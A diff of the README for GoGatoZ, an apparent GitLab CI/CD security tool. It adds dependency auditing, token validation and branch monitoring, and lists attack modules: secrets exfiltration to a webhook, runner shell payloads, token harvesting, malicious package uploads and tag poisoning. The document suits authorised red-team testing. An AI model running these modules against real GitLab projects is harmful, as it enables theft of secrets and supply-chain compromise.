@@ -16,7 +16,8 @@ GoGatoZ discovers GitLab projects, scans their CI/CD configurations for security
 ## Features
 
 - **Search** -- discover GitLab projects by name, language, topic, code content, or file path patterns
-- **Enumerate** -- scan `.gitlab-ci.yml` pipelines for 37 finding types across includes, runners, secrets, injection, supply chain, and LOTP vectors
+- **Enumerate** -- scan `.gitlab-ci.yml` pipelines and optional dependency metadata across includes, runners, secrets, injection, supply chain, and LOTP vectors
+- **Deps** -- audit lockfiles and CycloneDX/SPDX SBOMs in-process with native depx malicious-package intelligence
 - **Attack** -- 15+ exploitation modules: CI injection, secrets exfiltration, deploy keys, runner-on-runner, AI poisoning, supply chain attacks, and more
 - **Pivot** -- automated BFS lateral movement: enumerate, attack, harvest tokens, validate, and repeat at depth
 - **SecretScan** -- clone and scan repos for leaked secrets via TruffleHog, Gitleaks, or Titus
@@ -61,8 +62,8 @@ export GITLAB_TOKEN=glpat-xxx
 # 2. Search for projects
 gogatoz search -q "deploy" --per-page 20 --max-pages 1
 
-# 3. Enumerate CI/CD risks
-gogatoz enumerate --input targets.txt --concurrency 16 --json
+# 3. Enumerate CI/CD and dependency risks
+gogatoz enumerate --input targets.txt --concurrency 16 --dependencies --json
 
 # 4. Generate an HTML report
 gogatoz report --input results.jsonl --output report.html
@@ -100,9 +101,27 @@ gogatoz search -q "infra" --membership --visibility private
 
 Key flags: `--query`, `--language`, `--topic`, `--code-content`, `--path-pattern`, `--path-exists`, `--visibility`, `--membership`, `--owned`, `--archived-only`, `--format`, `--output`. Set `--max-pages 0` to fetch all pages.
 
+### validate
+
+Validate a GitLab token with read-only API requests and distinguish confirmed,
+inferred, denied, and unknown capabilities. No branches, runners, pipelines,
+variables, or other resources are created or modified.
+
+```bash
+# Instance-wide scope and access summary
+gogatoz validate --json
+
+# Add project role and default-branch protection evidence
+gogatoz validate --target group/project --json
+```
+
+Project-aware validation confirms repository and job visibility, then combines
+declared token scopes, the effective project role, and protected-branch rules to
+infer write capabilities. An inferred result is not a mutation test.
+
 ### enumerate
 
-Scan projects for CI/CD configuration vulnerabilities. Detects 37 finding types including include risks, runner exposure, MR-triggered jobs, variable injection, artifact poisoning, plaintext secrets, fork risks, script injection, LOTP tool execution, OIDC token exposure, cache poisoning, and more.
+Scan projects for CI/CD configuration vulnerabilities. Detects include risks, mutable release refs, runner exposure, MR-triggered jobs, variable injection, artifact poisoning, plaintext secrets, fork risks, script injection, LOTP tool execution, OIDC token exposure, cache poisoning, and more.
 
 ```bash
 # Scan from file
@@ -117,6 +136,13 @@ gogatoz enumerate --group myorg/platform --group-recursive --format jsonl
 # With runners and protected branch info
 gogatoz enumerate --input targets.txt --runners --protected-branches --score
 
+# Bound automatic runner discovery from recent job metadata and traces
+gogatoz enumerate --input targets.txt --runners \
+  --runner-log-max-pipelines 3 --runner-log-max-jobs 10 --json
+
+# Also audit repository lockfiles and SBOMs with native depx
+gogatoz enumerate --input targets.txt --dependencies --json
+
 # Output as SARIF + HTML
 gogatoz enumerate --input targets.txt --format html --output report.html --sarif-output scan.sarif
 
@@ -124,7 +150,64 @@ gogatoz enumerate --input targets.txt --format html --output report.html --sarif
 gogatoz search -q "runner" --format jsonl | gogatoz enumerate --input - --only-findings --json
 ```
 
-Key flags: `--input`, `--group`, `--groups`, `--concurrency`, `--timeout`, `--follow-includes`, `--include-depth`, `--deep`, `--runners`, `--runners-scope`, `--protected-branches`, `--score`, `--filter-false-positives`, `--only-findings`, `--redacted`, `--log-scrape`, `--format`, `--sarif-output`, `--glsast-output`, `--bloodhound-export`, `--webhook-url`.
+Key flags: `--input`, `--group`, `--groups`, `--concurrency`, `--timeout`, `--follow-includes`, `--include-depth`, `--deep`, `--dependencies`, `--depx-cache-dir`, `--depx-timeout`, `--runners`, `--runners-scope`, `--runner-log-max-pipelines`, `--runner-log-max-jobs`, `--protected-branches`, `--score`, `--filter-false-positives`, `--only-findings`, `--redacted`, `--log-scrape`, `--format`, `--sarif-output`, `--glsast-output`, `--bloodhound-export`, `--webhook-url`.
+
+### deps
+
+Audit dependency metadata directly with [ProjectDiscovery depx](https://github.com/projectdiscovery/depx). GoGatoZ calls depx's native Go implementation in-process; it never invokes a package manager and never installs or executes package contents or lifecycle scripts.
+
+```bash
+# Audit the current repository
+gogatoz deps audit .
+
+# Scan explicit lockfiles or SBOMs and fail CI on a finding
+gogatoz deps audit package-lock.json bom.cdx.json \
+  --format sarif --output dependency-findings.sarif --fail-on-findings
+
+# GitLab SAST report
+gogatoz deps audit . --format glsast --output gl-sast-report.json
+
+# Hold newly published npm/PyPI/RubyGems versions for review
+gogatoz deps audit . --cooldown 72h --format json
+
+# Statically inspect an exact package archive without installing it
+gogatoz deps verify --artifact /path/to/package.tgz --format json
+
+# Compare the artifact with reviewed source and signed-build provenance
+gogatoz deps verify --artifact /path/to/package.tgz \
+  --source /path/to/reviewed-source \
+  --provenance /path/to/provenance.json \
+  --expected-commit 0123456789abcdef0123456789abcdef01234567 \
+  --expected-ref refs/tags/v1.2.3 --fail-on-findings
+```
+
+Supported output formats are `text`, `json`, `sarif`, `glsast`, `gldep`,
+`cyclonedx`, and `spdx`. Malicious and quarantined findings include their
+source metadata file. When `--cooldown` is enabled, depx's native CycloneDX
+component inventory is enriched with release timestamps to detect newly
+published versions, dormant-package resurrection, and coordinated release
+bursts. Registry enrichment is disabled by default and never downloads package
+archives or executes package content.
+
+`deps verify` supports npm tarballs, Python wheels, Ruby gems, ZIP, and tar
+archives. It parses bounded members in memory and never extracts, installs, or
+executes package content. Optional source and SLSA/in-toto provenance checks
+detect artifact-only code, partial builds, and repository/commit/ref/pipeline
+mismatches. Verifier output is available as text, JSON, SARIF, or GitLab SAST.
+
+### watch
+
+Continuously monitor GitLab branch/tag targets and release workflow changes:
+
+```bash
+gogatoz watch --target group/project --branches main,next --interval 60s
+gogatoz watch --target group/project --format json --notify https://alerts.example.test/gogatoz
+```
+
+The first poll establishes an in-memory baseline. Later polls report
+non-fast-forward branch movement, tag retargeting/deletion/recreation,
+short-lived branches with recent pipeline activity, ref-creation bursts, and
+publishing-job changes.
 
 ### attack
 
@@ -141,6 +224,11 @@ gogatoz attack -t group/project --commit-ci --payload secrets --webhook https://
 
 # Render payload locally without committing
 gogatoz attack --payload-only --payload ror-shell --tags self-hosted --cmd 'id; uname -a'
+
+# Render a manual, preview-only Python package tamper test
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem pypi --tamper-trigger import \
+  --tamper-entry-file src/acme_fixture/__init__.py
 ```
 
 **Secrets Exfiltration:**
@@ -172,6 +260,7 @@ gogatoz attack -t group/project --commit-ci --payload ror-shell \
 | `--harvest`           | Install git hooks on runner, harvest tokens via callbacks   |
 | `--tamper-release`    | Modify GitLab release metadata and asset links              |
 | `--tamper-package`    | Upload malicious packages to the Generic Packages registry  |
+| `--package-tamper`   | Stage a manual npm/PyPI/RubyGems tamper preview             |
 | `--tamper-tag`        | Poison a git tag by replacing files (Trivy-style)           |
 | `--lotp-inject`       | Living off the Pipeline tool config injection               |
 | `--variable-inject`   | Inject malicious CI variables                               |
